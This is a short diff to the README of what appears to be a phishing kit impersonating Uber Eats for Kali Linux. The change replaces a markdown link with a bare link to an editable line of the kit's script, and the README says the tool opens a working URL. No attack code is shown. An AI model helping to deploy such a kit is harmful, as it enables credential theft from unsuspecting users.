@@ -1,7 +1,7 @@
 # UberEats-Phishing - Fixed (Kali linux)
 
 Start from here (edit file "./Uber-eats.sh"):
-[https://github.com/pols1lver/uber-eats-phishing-fixed/blob/eb5812e3595ab0f4bf09adfac8c556f0ce40a37a/Uber-eats.sh#L62](https://github.com/pols1lver/uber-eats-phishing-fixed/blob/aa9ee33173fc02b3ccc790177940d93cc781f372/Uber-eats.sh#L62)
+https://github.com/pols1lver/uber-eats-phishing-fixed/blob/aa9ee33173fc02b3ccc790177940d93cc781f372/Uber-eats.sh#L62
 
 New console should open with working url.
 
